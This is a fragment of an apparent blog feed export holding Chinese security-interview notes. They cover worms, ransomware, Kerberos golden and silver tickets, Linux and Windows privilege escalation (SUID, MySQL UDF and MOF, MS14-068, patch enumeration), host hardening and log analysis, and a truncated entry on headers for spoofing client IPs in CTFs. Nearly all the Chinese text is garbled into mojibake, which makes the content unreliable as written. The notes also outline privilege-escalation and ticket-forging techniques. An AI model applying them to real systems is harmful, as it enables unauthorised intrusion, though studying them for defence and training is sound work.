</p><p>(1)‰º†Êí≠Ê®°ÂùóÔºöË¥üË¥£Ë†ïËô´ÁöÑ‰º†Êí≠ÔºåÂÆÉÂèØ‰ª•ÂàÜ‰∏∫Êâ´ÊèèÊ®°Âùó„ÄÅÊîªÂáªÊ®°ÂùóÂíåÂ§çÂà∂Ê®°Âùó‰∏â‰∏™Â≠êÊ®°Âùó„ÄÇÂÖ∂‰∏≠ÔºåÊâ´ÊèèÊ®°ÂùóË¥üË¥£Êé¢ÊµãÂ≠òÂú®ÊºèÊ¥ûÁöÑ‰∏ªÊú∫ÔºõÊîªÂáªÊ®°ÂùóÊåâÊºèÊ¥ûÊîªÂáªÊ≠•È™§Ëá™Âä®ÊîªÂáªÊâæÂà∞ÁöÑÂØπË±°ÔºõÂ§çÂà∂Ê®°ÂùóÈÄöËøáÂéü‰∏ªÊú∫ÂíåÊñ∞‰∏ªÊú∫‰∫§‰∫íÂ∞ÜË†ïËô´Á®ãÂ∫èÂ§çÂà∂Âà∞Êñ∞‰∏ªÊú∫Âπ∂ÂêØÂä®„ÄÇ [3] </p><p>(2)ÈöêËóèÊ®°ÂùóÔºö‰æµÂÖ•‰∏ªÊú∫ÂêéÔºåË¥üË¥£ÈöêËóèË†ïËô´Á®ãÂ∫è„ÄÇ [3] </p><p>(3)ÁõÆÁöÑÂäüËÉΩÊ®°ÂùóÔºöÂÆûÁé∞ÂØπËÆ°ÁÆóÊú∫ÁöÑÊéßÂà∂„ÄÅÁõëËßÜÊàñÁ†¥ÂùèÁ≠â„ÄÇ [3] </p><h3 id="ÂéüÁêÜ"><a href="#ÂéüÁêÜ" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h3><p>Ê†πÊçÆË†ïËô´ÁóÖÊØíÁöÑÁ®ãÂ∫èÂÖ∂Â∑•‰ΩúÊµÅÁ®ãÂèØ‰ª•ÂàÜ‰∏∫ÊºèÊ¥ûÊâ´Êèè„ÄÅÊîªÂáª„ÄÅ‰º†Êüì„ÄÅÁé∞Âú∫Â§ÑÁêÜÂõõ‰∏™Èò∂ÊÆµÔºåÈ¶ñÂÖàË†ïËô´Á®ãÂ∫èÈöèÊú∫(ÊàñÂú®ÊüêÁßçÂÄæÂêëÊÄßÁ≠ñÁï•‰∏ã)ÈÄâÂèñÊüê‰∏ÄÊÆµIPÂú∞ÂùÄÔºåÊé•ÁùÄÂØπËøô‰∏ÄÂú∞ÂùÄÊÆµÁöÑ‰∏ªÊú∫Êâ´ÊèèÔºåÂΩìÊâ´ÊèèÂà∞ÊúâÊºèÊ¥ûÁöÑËÆ°ÁÆóÊú∫Á≥ªÁªüÂêéÔºåÂ∞ÜË†ïËô´‰∏ª‰ΩìËøÅÁßªÂà∞ÁõÆÊ†á‰∏ªÊú∫„ÄÇÁÑ∂ÂêéÔºåË†ïËô´Á®ãÂ∫èËøõÂÖ•Ë¢´ÊÑüÊüìÁöÑÁ≥ªÁªüÔºåÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÁé∞Âú∫Â§ÑÁêÜ„ÄÇÂêåÊó∂ÔºåË†ïËô´Á®ãÂ∫èÁîüÊàêÂ§ö‰∏™ÂâØÊú¨ÔºåÈáçÂ§ç‰∏äËø∞ÊµÅÁ®ã„ÄÇÂêÑ‰∏™Ê≠•È™§ÁöÑÁπÅÁÆÄÁ®ãÂ∫¶‰πü‰∏çÂêåÔºåÊúâÁöÑÂçÅÂàÜÂ§çÊùÇÔºåÊúâÁöÑÂàôÈùûÂ∏∏ÁÆÄÂçï„ÄÇ</p><h2 id="ÂãíÁ¥¢ÁóÖÊØí"><a href="#ÂãíÁ¥¢ÁóÖÊØí" class="headerlink" title="ÂãíÁ¥¢ÁóÖÊØí"></a>ÂãíÁ¥¢ÁóÖÊØí</h2><p>ÂãíÁ¥¢ÁóÖÊØíÔºöËÉΩÂØπÁî®Êà∑Êñá‰ª∂ËøõË°åÂä†ÂØÜÁöÑÁóÖÊØí„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/img_convert/dba35b1c085dc28b692e4d0f9770e8ed.jpg" alt="lesuo"></p><h2 id="ÂÆèÁóÖÊØí"><a href="#ÂÆèÁóÖÊØí" class="headerlink" title="ÂÆèÁóÖÊØí"></a>ÂÆèÁóÖÊØí</h2><p>ÂÆèÊòØÂæÆËΩØÂÖ¨Âè∏‰∏∫ÂÖ∂OfficeËΩØ‰ª∂ÂåÖËÆæËÆ°ÁöÑ‰∏Ä‰∏™ÁâπÊÆäÂäüËÉΩÔºåÁî±‰∫éÂÖ∂ÂäüËÉΩÂº∫Â§ßÔºå‰ΩøÂæóÈªëÂÆ¢ÂèØ‰ª•ÈÄöËøáÁ≤æÂøÉÊûÑÈÄ†ÁöÑÂÆè‰ª£Á†ÅÊù•ÂÆûÁé∞ÊÅ∂ÊÑèÊìç‰ΩúÔºåËøô‰∫õ‰ª£Á†ÅÂ∞±Âè´ÂÅöÂÆèÁóÖÊØí„ÄÇÂÆèÁóÖÊØíÂ∏∏‰ª•ÂûÉÂúæÈÇÆ‰ª∂ÁöÑÊñπÂºèÂØπÁî®Êà∑ËøõË°åÊîªÂáªÔºåÂõ†‰∏∫‰º™ÈÄ†ÁöÑOfficeÊñáÊ°£‰∏çÂÆπÊòìÂºïËµ∑Áî®Êà∑ÁöÑÊÄÄÁñëÔºåÊâÄ‰ª•ÂΩìÁî®Êà∑ÊØ´Êó†Èò≤Â§áÁöÑÊâìÂºÄOfficeÊñáÊ°£Âπ∂ÂêØÁî®ÂÆè‰πãÂêéÔºåÂÆèÁóÖÊØí‰æøÂºÄÂßã‰∫ÜËøêË°åÔºåÂØπÁî®Êà∑‰∏ªÊú∫ËøõË°åÊÅ∂ÊÑèÊìç‰Ωú„ÄÇ</p><h2 id="ÂÜÖÁΩëÈªÑÈáëÁ•®ÊçÆÂéüÁêÜ"><a href="#ÂÜÖÁΩëÈªÑÈáëÁ•®ÊçÆÂéüÁêÜ" class="headerlink" title="ÂÜÖÁΩëÈªÑÈáëÁ•®ÊçÆÂéüÁêÜ"></a>ÂÜÖÁΩëÈªÑÈáëÁ•®ÊçÆÂéüÁêÜ</h2><p>Âú®KerberosËÆ§ËØÅ‰∏≠,ClientÈÄöËøáAS(Ë∫´‰ªΩËÆ§ËØÅÊúçÂä°)ËÆ§ËØÅÂêé,AS‰ºöÁªôClient‰∏Ä‰∏™<br>Logon Session KeyÂíåTGT,ËÄåLogon Session KeyÂπ∂‰∏ç‰ºö‰øùÂ≠òÂú®KDC‰∏≠ÔºåkrbtgtÁöÑNTLM HashÂèàÊòØÂõ∫ÂÆöÁöÑ,ÊâÄ‰ª•Âè™Ë¶ÅÂæóÂà∞krbtgtÁöÑNTLM HashÔºåÂ∞±ÂèØ‰ª•‰º™ÈÄ†TGTÂíåLogon Session KeyÊù•ËøõÂÖ•‰∏ã‰∏ÄÊ≠•Client‰∏éTGSÁöÑ‰∫§‰∫í„ÄÇËÄåÂ∑≤Êúâ‰∫ÜÈáëÁ•®Âêé,Â∞±Ë∑≥ËøáASÈ™åËØÅ,‰∏çÁî®È™åËØÅË¥¶Êà∑ÂíåÂØÜÁ†Å,ÊâÄ‰ª•‰πü‰∏çÊãÖÂøÉÂüüÁÆ°ÂØÜÁ†Å‰øÆÊîπ„ÄÇ</p><h2 id="ÈªÑÈáëÁ•®ÊçÆÂíåÁôΩÈì∂Á•®ÊçÆÁöÑÂå∫Âà´Ôºü"><a href="#ÈªÑÈáëÁ•®ÊçÆÂíåÁôΩÈì∂Á•®ÊçÆÁöÑÂå∫Âà´Ôºü" class="headerlink" title="ÈªÑÈáëÁ•®ÊçÆÂíåÁôΩÈì∂Á•®ÊçÆÁöÑÂå∫Âà´Ôºü"></a>ÈªÑÈáëÁ•®ÊçÆÂíåÁôΩÈì∂Á•®ÊçÆÁöÑÂå∫Âà´Ôºü</h2><p><strong>Ëé∑ÂèñÁöÑÊùÉÈôê‰∏çÂêå</strong><br>ÈáëÁ•®:‰º™ÈÄ†ÁöÑTGTÔºåÂèØ‰ª•Ëé∑Âèñ‰ªªÊÑèKerberosÁöÑËÆøÈóÆÊùÉÈôê</p><p>Èì∂Á•®:‰º™ÈÄ†ÁöÑSTÔºåÂè™ËÉΩËÆøÈóÆÊåáÂÆöÁöÑÊúçÂä°ÔºåÂ¶ÇCIFS<br><strong>ËÆ§ËØÅÊµÅÁ®ã‰∏çÂêå</strong><br>ÈáëÁ•®: ÂêåKDC‰∫§‰∫íÔºå‰ΩÜ‰∏çÂêåAS‰∫§‰∫í<br>Èì∂Á•®:‰∏çÂêåKDC‰∫§‰∫íÔºåÁõ¥Êé•ËÆøÈóÆServer<br><strong>Âä†ÂØÜÊñπÂºè‰∏çÂêå</strong><br>ÈáëÁ•®: Áî±krbtgt NTLM Hash Âä†ÂØÜ<br>Èì∂Á•®: Áî±ÊúçÂä°Ë¥¶Âè∑ NTLM Hash Âä†ÂØÜ</p><h2 id="ÊèêÊùÉ"><a href="#ÊèêÊùÉ" class="headerlink" title="ÊèêÊùÉ"></a>ÊèêÊùÉ</h2><h3 id="linuxÊèêÊùÉ"><a href="#linuxÊèêÊùÉ" class="headerlink" title="linuxÊèêÊùÉ"></a>linuxÊèêÊùÉ</h3><p>1.ÈÄöËøá su ÂëΩ‰ª§Êö¥Á†¥ root ÂØÜÁ†Å</p><p>2.ÂÜÖÊ†∏ÊºèÊ¥ûÊèêÊùÉ</p><p>3.SUIDÊèêÊùÉÔºöSUIDÂèØ‰ª•ËÆ©Á®ãÂ∫èË∞ÉÁî®ËÄÖ‰ª•Êñá‰ª∂Êã•ÊúâËÄÖÁöÑË∫´‰ªΩËøêË°åËØ•Êñá‰ª∂ÔºåÂΩìÊàë‰ª¨‰ª•‰∏Ä‰∏™ÊôÆÈÄöÁî®Êà∑ÂéªËøêË°å‰∏Ä‰∏™rootÁî®Êà∑ÊâÄÊúâÁöÑSUIDÊñá‰ª∂ÔºåÈÇ£‰πàËøêË°åËØ•Êñá‰ª∂Êàë‰ª¨Â∞±ÂèØ‰ª•Ëé∑ÂèñÂà∞rootÊùÉÈôê</p><p>4.findÔºöfindÂÆûÁî®Á®ãÂ∫èfindÂèØÁî®‰∫éÂèëÁé∞Â≠òÂÇ®Âú®Á≥ªÁªü‰∏ä„ÄÇÁÑ∂ËÄåÔºåÂÆÉÊòØÊâßË°åÂëΩ‰ª§ÁöÑËÉΩÂäõ„ÄÇÂõ†Ê≠§ÔºåÂ¶ÇÊûúÂÆÉË¢´ÈÖçÁΩÆ‰∏∫‰ΩøÁî® SUID ÊùÉÈôêËøêË°åÔºåÈÇ£‰πàÊâÄÊúâÂ∞ÜÈÄöËøá find ÊâßË°åÁöÑÂëΩ‰ª§ÈÉΩÂ∞Ü‰ª• root Ë∫´‰ªΩÊâßË°å„ÄÇ</p><h3 id="windowÊèêÊùÉ"><a href="#windowÊèêÊùÉ" class="headerlink" title="windowÊèêÊùÉ"></a>windowÊèêÊùÉ</h3><p><strong>1„ÄÅÁ≥ªÁªüÂÜÖÊ†∏Ê∫¢Âá∫ÊºèÊ¥ûÊèêÊùÉ</strong></p><p><strong>#ÊâãÂ∑•Êü•ÊâæË°•‰∏ÅÊÉÖÂÜµ</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">systeminfo  #Êü•ÁúãË°•‰∏Åwmic qfe get Description,HotFixID,InstalledOn  #Êü•ÁúãË°•‰∏Å‰ø°ÊÅØ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>#MSFÂêéÊ∏óÈÄèÊâ´Êèè</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">post/windows/gather/enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2„ÄÅatÂëΩ‰ª§Âà©Áî®</strong></p><p><strong>Âú®Windows2000„ÄÅWindows 2003„ÄÅWindows XP Ëøô‰∏âÁ±ªÁ≥ªÁªü‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®atÂëΩ‰ª§Â∞ÜÊùÉÈôêÊèêÂçáËá≥systemÊùÉÈôê„ÄÇ</strong></p><p><strong>3.Êï∞ÊçÆÂ∫ìÊèêÊùÉ</strong></p><pre class="line-numbers language-none"><code class="language-none">udfÊèêÊùÉÔºöÈÄöËøáÂàõÂª∫Áî®Êà∑Ëá™ÂÆö‰πâÂáΩÊï∞ÔºåÂØπmysqlÂäüËÉΩËøõË°åÊâ©ÂÖÖÔºåÂèØ‰ª•ÊâßË°åÁ≥ªÁªü‰ªªÊÑèÂëΩ‰ª§ÔºåÂ∞ÜmysqlË¥¶Âè∑rootËΩ¨Âåñ‰∏∫Á≥ªÁªüsystemÊùÉÈôê„ÄÇmofÊèêÊùÉÔºöÂú®windowsÂπ≥Âè∞‰∏ãÔºåc:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof Ëøô‰∏™Êñá‰ª∂‰ºöÊØèÈó¥Èöî‰∏ÄÊÆµÊó∂Èó¥ÔºàÂæàÁü≠ÊöÇÔºâÂ∞±‰ºö‰ª•systemÊùÉÈôêÊâßË°å‰∏ÄÊ¨°ÔºåÊâÄ‰ª•ÔºåÂè™Ë¶ÅÊàë‰ª¨Â∞ÜÊàë‰ª¨ÂÖàË¶ÅÂÅöÁöÑ‰∫ãÈÄöËøá‰ª£Á†ÅÂ≠òÂÇ®Âà∞Ëøô‰∏™mofÊñá‰ª∂‰∏≠ÔºåÂ∞±ÂèØ‰ª•ÂÆûÁé∞ÊùÉÈôêÊèêÂçá„ÄÇÂêØÂä®È°πÊèêÊùÉÔºöÂ∞ÜÂêéÈù¢ËÑöÊú¨‰∏ä‰º†Âà∞Á≥ªÁªüÂêØÂä®ÁõÆÂΩïÔºåÂΩìÊúçÂä°Âô®ÈáçÂêØÂ∞±‰ºöËá™Âä®ÊâßË°åËØ•ËÑöÊú¨Ôºå‰ªéËÄåËé∑ÂèñÁ≥ªÁªüÊùÉÈôê„ÄÇ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>4.MS14-068 ÂüüÁî®Êà∑ÊèêÊùÉÊºèÊ¥û</strong></p><p>ÊúçÂä°Á•®ÊçÆÊòØÂÆ¢Êà∑Á´ØÁõ¥Êé•ÂèëÈÄÅÁªôÊúçÂä°Âô®,Âπ∂ËØ∑Ê±ÇÊúçÂä°ËµÑÊ∫êÁöÑ„ÄÇÂ¶ÇÊûúÊúçÂä°Âô®Ê≤°ÊúâÂêë<a href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7&spm=1001.2101.3001.7020">ÂüüÊéß</a>dcÈ™åËØÅpacÁöÑËØù,ÈÇ£‰πàÂÆ¢Êà∑Á´ØÂèØ‰ª•‰º™ÈÄ†ÂüüÁÆ°ÁöÑÊùÉÈôêÊù•ËÆøÈóÆÊúçÂä°Âô®„ÄÇ</p><h2 id="‰∏ªÊú∫Âä†Âõ∫"><a href="#‰∏ªÊú∫Âä†Âõ∫" class="headerlink" title="‰∏ªÊú∫Âä†Âõ∫"></a>‰∏ªÊú∫Âä†Âõ∫</h2><h3 id="LinuxÂä†Âõ∫"><a href="#LinuxÂä†Âõ∫" class="headerlink" title="LinuxÂä†Âõ∫"></a>LinuxÂä†Âõ∫</h3><p>**1.**‰øÆÊîπsshÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºåÁ¶ÅÊ≠¢rootÁõ¥Êé•ÁôªÂΩï</p><p>**2.**‰øÆÊîπÂØÜÁ†ÅÁ≠ñÁï•ÈÖçÁΩÆÊñá‰ª∂ÔºåÁ°Æ‰øùÂØÜÁ†ÅÊúÄÂ∞èÈïøÂ∫¶‰∏∫8‰Ωç</p><p>**3.**Á°Æ‰øùÈîôËØØÁôªÂΩï3Ê¨°ÔºåÈîÅÂÆöÊ≠§Ë¥¶Êà∑5ÂàÜÈíü</p><p>**4.**Á¶ÅÊ≠¢suÈùûÊ≥ïÊèêÊùÉÔºåÂè™ÂÖÅËÆ∏rootÂíåwheelÁªÑÁî®Êà∑suÂà∞root</p><p>**5.**‰∏çÂìçÂ∫îICMPËØ∑Ê±Ç</p><p>**6.**ËÆæÁΩÆÁôªÈôÜË∂ÖÊó∂Êó∂Èó¥‰∏∫10ÂàÜÈíü</p><p><strong>7.</strong> ÁªìÊùüÈùûÊ≥ïÁôªÂΩïÁî®Êà∑</p><h3 id="WindowsÂä†Âõ∫"><a href="#WindowsÂä†Âõ∫" class="headerlink" title="WindowsÂä†Âõ∫"></a><strong>WindowsÂä†Âõ∫</strong></h3><p><strong>1.</strong>  <strong>‰øÆÊîπ3389Á´ØÂè£</strong></p><p><strong>2.</strong>  ËÆæÁΩÆÂÆâÂÖ®Á≠ñÁï•Ôºå‰∏çÂÖÅËÆ∏<strong>SAM</strong>Â∏êÊà∑ÁöÑÂåøÂêçÊûö‰∏æÔºå‰∏çÂÖÅËÆ∏SAMÂ∏êÊà∑ÂíåÂÖ±‰∫´ÁöÑÂåøÂêçÊûö‰∏æ</p><p><strong>3.<strong>Âú®ÁªÑÁ≠ñÁï•‰∏≠ËÆæÁΩÆ</strong>ÈòªÊ≠¢ËÆøÈóÆÊ≥®ÂÜåË°®ÁºñËæëÂ∑•ÂÖ∑</strong></p><p><strong>4.</strong>  <strong>ÂºÄÂêØÂÆ°Ê†∏ÂØπË±°ËÆøÈóÆÔºåÊàêÂäü‰∏éÂ§±Ë¥•ÔºõÂºÄÂêØÂÆ°Ê†∏ÁõÆÂΩïÊúçÂä°ËÆøÈóÆÔºåÊàêÂäü‰∏éÂ§±Ë¥•ÔºõÂºÄÂêØÂÆ°Ê†∏Á≥ªÁªü‰∫ã‰ª∂ÔºåÊàêÂäü‰∏éÂ§±Ë¥•</strong></p><p><strong>5.</strong>  <strong>Á¶ÅÊ≠¢445Á´ØÂè£ÊºèÊ¥û</strong></p><p><strong>6.</strong>  <strong>ËÆæÁΩÆÂ±èÂπï‰øùÊä§Âú®ÊÅ¢Â§çÊó∂‰ΩøÁî®ÂØÜÁ†Å‰øùÊä§</strong></p><p><strong>7.</strong>  <strong>ËÆæÁΩÆwindowsÂØÜÁ†ÅÁ≠ñÁï•</strong>Ôºö‰ΩøÂØÜÁ†ÅÂøÖÈ°ªÊª°Ë∂≥Â§çÊùÇÊÄßÔºåËÆæÁΩÆÂØÜÁ†ÅÈïøÂ∫¶ÊúÄÂ∞èÂÄº‰∏∫8‰ΩçÔºåËÆæÁΩÆÂØÜÁ†ÅÊúÄÈïøÂ≠òÁïôÊúü‰∏∫30Â§©</p><p><strong>8.</strong>  ÂºÄÂêØWindowsÈò≤ÁÅ´Â¢ôÔºå<strong>ÂÖ≥Èó≠pingÊúçÂä°</strong>ÔºåÊâìÂºÄ3389„ÄÅ80Á≠âÊúçÂä°</p><p><strong>9.</strong>  <strong>ÂÖ≥Èó≠Á≥ªÁªüÈªòËÆ§ÂÖ±‰∫´</strong></p><h2 id="Êó•ÂøóÂàÜÊûê"><a href="#Êó•ÂøóÂàÜÊûê" class="headerlink" title="Êó•ÂøóÂàÜÊûê"></a>Êó•ÂøóÂàÜÊûê</h2><h3 id="1-Á≥ªÁªüÊó•Âøó"><a href="#1-Á≥ªÁªüÊó•Âøó" class="headerlink" title="1.Á≥ªÁªüÊó•Âøó"></a>1.Á≥ªÁªüÊó•Âøó</h3><p>ÂàÜÊûêÊñπÊ≥ïÔºö</p><p>a„ÄÅÂâçÊèêÔºöÂºÄÂêØÂÆ°Ê†∏Á≠ñÁï•ÔºåËã•Êó•ÂêéÁ≥ªÁªüÂá∫Áé∞ÊïÖÈöú„ÄÅÂÆâÂÖ®‰∫ãÊïÖÂàôÂèØ‰ª•Êü•ÁúãÁ≥ªÁªüÁöÑÊó•ÂøóÊñá‰ª∂ÔºåÊéíÈô§ÊïÖÈöúÔºåËøΩÊü•ÂÖ•‰æµËÄÖÁöÑ‰ø°ÊÅØÁ≠â„ÄÇ</p><p>b„ÄÅWin+RÊâìÂºÄËøêË°åÔºåËæìÂÖ•<code>eventvwr.msc</code>ÔºåÂõûËΩ¶ËøêË°åÔºåÊâìÂºÄ‰∫ã‰ª∂Êü•ÁúãÂô®„ÄÇ</p><p>c„ÄÅÂØºÂá∫Â∫îÁî®Á®ãÂ∫èÊó•Âøó„ÄÅÂÆâÂÖ®Êó•Âøó„ÄÅÁ≥ªÁªüÊó•ÂøóÔºåÂà©Áî®Log ParserËøõË°åÂàÜÊûê„ÄÇ</p><h3 id="2-webËÆøÈóÆÊó•Âøó"><a href="#2-webËÆøÈóÆÊó•Âøó" class="headerlink" title="2.webËÆøÈóÆÊó•Âøó"></a>2.webËÆøÈóÆÊó•Âøó</h3><p>ÂàÜÊûêÊñπÊ≥ïÔºö</p><p>a„ÄÅÊâæÂà∞‰∏≠Èó¥‰ª∂ÁöÑwebÊó•ÂøóÔºåÊâìÂåÖÂà∞Êú¨Âú∞Êñπ‰æøËøõË°åÂàÜÊûê„ÄÇ</p><p>b„ÄÅÊé®ËçêÂ∑•ÂÖ∑Ôºö</p><ul><li>Windows‰∏ãÔºåÊé®Ëçê‰ΩøÁî®EmEditorËøõË°åÊó•ÂøóÂàÜÊûêÔºåÊîØÊåÅÂ§ßÊñáÊú¨ÔºåÊêúÁ¥¢ÊïàÁéá‰∏çÈîô„ÄÇ</li><li>Linux‰∏ãÔºå‰ΩøÁî®ShellÂëΩÂêçÁªÑÂêàÊü•ËØ¢ÂàÜÊûê„ÄÇ</li></ul><h2 id="Ê≠£ÂêëshellÂíåÂèçÂêëshell"><a href="#Ê≠£ÂêëshellÂíåÂèçÂêëshell" class="headerlink" title="Ê≠£ÂêëshellÂíåÂèçÂêëshell"></a><strong>Ê≠£ÂêëshellÂíåÂèçÂêëshell</strong></h2><p> Ê≠£ÂêëshellÔºöÊéßÂà∂Á´Ø‰∏ªÂä®ÂèëËµ∑ËøûÊé•ÂéªËøûÊé•Ë¢´ÊéßÂà∂Á´Ø<br> ÂèçÂêëshellÔºöË¢´ÊéßÂà∂Á´Ø‰∏ªÂä®ËøûÊé•ÊéßÂà∂Á´Ø</p><h2 id="Èò≤ÁÅ´Â¢ô‰∏≠ÁöÑDMZÂå∫ÂüüÔºåTrustÂå∫ÂüüÔºåUntrustÂå∫Âüü"><a href="#Èò≤ÁÅ´Â¢ô‰∏≠ÁöÑDMZÂå∫ÂüüÔºåTrustÂå∫ÂüüÔºåUntrustÂå∫Âüü" class="headerlink" title="Èò≤ÁÅ´Â¢ô‰∏≠ÁöÑDMZÂå∫ÂüüÔºåTrustÂå∫ÂüüÔºåUntrustÂå∫Âüü"></a>Èò≤ÁÅ´Â¢ô‰∏≠ÁöÑDMZÂå∫ÂüüÔºåTrustÂå∫ÂüüÔºåUntrustÂå∫Âüü</h2><h3 id="DMZÂå∫ÂüüÔºàÈùûÂÜõ‰∫ãÂåñÂå∫Ôºâ"><a href="#DMZÂå∫ÂüüÔºàÈùûÂÜõ‰∫ãÂåñÂå∫Ôºâ" class="headerlink" title="DMZÂå∫ÂüüÔºàÈùûÂÜõ‰∫ãÂåñÂå∫Ôºâ"></a>DMZÂå∫ÂüüÔºàÈùûÂÜõ‰∫ãÂåñÂå∫Ôºâ</h3><p> 1.‰∏§‰∏™Èò≤ÁÅ´Â¢ô‰πãÈó¥ÁöÑÁ©∫Èó¥Ë¢´Áß∞‰∏∫DMZ„ÄÇ‰∏éInternetÁõ∏ÊØîÔºåDMZÂèØ‰ª•Êèê‰æõÊõ¥È´òÁöÑÂÆâÂÖ®ÊÄßÔºå‰ΩÜÊòØÂÖ∂ÂÆâÂÖ®ÊÄßÊØîÂÜÖÈÉ®ÁΩëÁªú‰Ωé„ÄÇ<br> 2.ÊúçÂä°Âô® ÂÜÖ Â§ñÁΩëÈÉΩÂèØ‰ª•ËÆøÈóÆ,‰ΩÜËøòÊòØ‰∏éÂÜÖÁΩëÈöîÁ¶ª.<br> Â∞±ÁÆóÊòØÈªëÂÆ¢ÊääDMZÊúçÂä°Âô®Êãø‰∏ã,‰πü‰∏çËÉΩ‰ΩøÁî®ÊúçÂä°Âô®Êù•ÊéßÂà∂ÂÜÖÁΩëÁöÑÁΩëÁªú.Ëµ∑Âà∞ÂÆâÂÖ®ÁöÑÁ≠ñÁï•<br>TrustÂå∫ÂüüÔºå</p><h3 id="TrustÂå∫ÂüüÔºàÂèó‰ø°Âå∫Ôºâ"><a href="#TrustÂå∫ÂüüÔºàÂèó‰ø°Âå∫Ôºâ" class="headerlink" title="TrustÂå∫ÂüüÔºàÂèó‰ø°Âå∫Ôºâ"></a>TrustÂå∫ÂüüÔºàÂèó‰ø°Âå∫Ôºâ</h3><p> ÂèØ‰ø°‰ªªÁöÑÊé•Âè£.ÊòØÂ±ÄÂüüÁΩëÁöÑÊé•Âè£.Ê≠§Êé•Âè£Â§ñÁΩëÂíåDMZÊó†Ê≥ïËÆøÈóÆ.<br> Â§ñÈÉ®‰∏çËÉΩËÆøÈóÆtrustÂè£<br> DMZ‰∏çËÉΩËÆøÈóÆtrustÂè£</p><h3 id="UntrustÂå∫ÂüüÔºàÈùûÂèó‰ø°Âå∫Ôºâ"><a href="#UntrustÂå∫ÂüüÔºàÈùûÂèó‰ø°Âå∫Ôºâ" class="headerlink" title="UntrustÂå∫ÂüüÔºàÈùûÂèó‰ø°Âå∫Ôºâ"></a>UntrustÂå∫ÂüüÔºàÈùûÂèó‰ø°Âå∫Ôºâ</h3><p> ‰∏ç‰ø°‰ªªÁöÑÊé•Âè£,ÊòØÁî®Êù•Êé•internetÁöÑ,Ëøô‰∏™Êé•Âè£ÁöÑ‰ø°ÊÅØÂÜÖÁΩë‰∏çÊé•Âèó<br> ÂèØ‰ª•ÈÄöËøáuntrustÂè£ËÆøÈóÆDMZ,‰ΩÜ‰∏çËÉΩËÆøÈóÆtrustÂè£**</p>]]></content>
      
      
      <categories>
          
          <category> hvv </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF Áî®‰∫é‰º™ÈÄ†ipÁöÑhttpËØ∑Ê±ÇÂ§¥</title>
      <link href="/2023/05/13/CTF-%E7%94%A8%E4%BA%8E%E4%BC%AA%E9%80%A0ip%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
      <url>/2023/05/13/CTF-%E7%94%A8%E4%BA%8E%E4%BC%AA%E9%80%A0ip%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h3 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For:"></a>X-Forwarded-For:</h3><p>ËØ•Â≠óÊÆµÂåÖÂê´ÂÆ¢Êà∑Á´ØÈÄöËøá‰ª£ÁêÜÊúçÂä°Âô®ËΩ¨ÂèëÁöÑIPÂú∞ÂùÄÔºåËøôÈÄöÂ∏∏Áî®‰∫éÈ™åËØÅÂÆ¢Êà∑Á´ØÊòØÂê¶ÈÄöËøá‰ª£ÁêÜÊúçÂä°Âô®ËøõË°åÈÄö‰ø°„ÄÇ</p><h3 id="Client-ip"><a href="#Client-ip" class="headerlink" title="Client-ip:"></a>Client-ip:</h3><p>ËØ•Â≠óÊÆµÂåÖÂê´ÂÆ¢Êà∑Á´ØÁöÑIPÂú∞ÂùÄÔºåÁî®‰∫éÈ™åËØÅÂÆ¢Êà∑Á´ØÊòØÂê¶‰∏éÊúçÂä°Âô®Âú®Âêå‰∏ÄÁΩëÁªú‰∏≠„ÄÇ</p><h3 id="X-Client-IP"><a href="#X-Client-IP" class="headerlink" title="X-Client-IP:"></a>X-Client-IP:</h3><p>ËØ•Â≠óÊÆµÂåÖÂê´ÂÆ¢Êà∑Á´ØÁöÑIPÂú∞ÂùÄÔºåÁî®‰∫éÈ™åËØÅÂÆ¢Êà∑Á´ØÊòØÂê¶‰∏éÊúçÂä°Âô®Âú®Âêå‰∏ÄÁΩëÁªú‰∏≠„ÄÇ</p><h3 id="X-Remote-IP"><a href="#X-Remote-IP" class="headerlink" title="X-Remote-IP:"></a>X-Remote-IP:</h3><p>ËØ•Â≠óÊÆµÂåÖÂê´ÊúçÂä°Âô®ËøîÂõûÁªôÂÆ¢Êà∑Á´ØÁöÑIPÂú∞ÂùÄÔºåÁî®‰∫éÈ™åËØÅÊúçÂä°Âô®ÊòØÂê¶‰∏éÂÆ¢Êà∑Á´ØÂú®Âêå‰∏ÄÁΩëÁªú‰∏≠„ÄÇ</p><h3 id="X-Rriginating-IP"><a href="#X-Rriginating-IP" class="headerlink" title="X-Rriginating-IP:"></a>X-Rriginating-IP:</h3><p>ËØ•Â≠óÊÆµÂåÖÂê´ÊúçÂä°Âô®ÁºìÂ≠ò‰∏≠‰øùÂ≠òÁöÑIPÂú∞ÂùÄÔºåÁî®‰∫éÈ™åËØÅÊúçÂä°Âô®ÊòØÂê¶Âú®Êú¨Âú∞ÁºìÂ≠ò‰∏≠‰øùÂ≠ò‰∫ÜÂÆ¢Êà∑Á´ØÁöÑIPÂú∞ÂùÄ„ÄÇ</p><h3 id="X-Remote-addr"><a href="#X-Remote-addr" class="headerlink" title="X-Remote-addr:"></a>X-Remote-addr:</h3><p>ËØ•Â≠óÊÆµÂåÖÂê´ÊúçÂä°Âô®ËøîÂõûÁªôÂÆ¢Êà∑Á´ØÁöÑIPÂú∞ÂùÄÔºåÁî®‰∫éÈ™åËØÅÊúçÂä°Âô®ÊòØÂê¶‰∏éÂÆ¢Êà∑Á´ØÂú®Âêå‰∏ÄÁΩëÁªú‰∏≠„ÄÇ</p><h3 id="HTTP-CLIENT-IP"><a href="#HTTP-CLIENT-IP" class="headerlink" 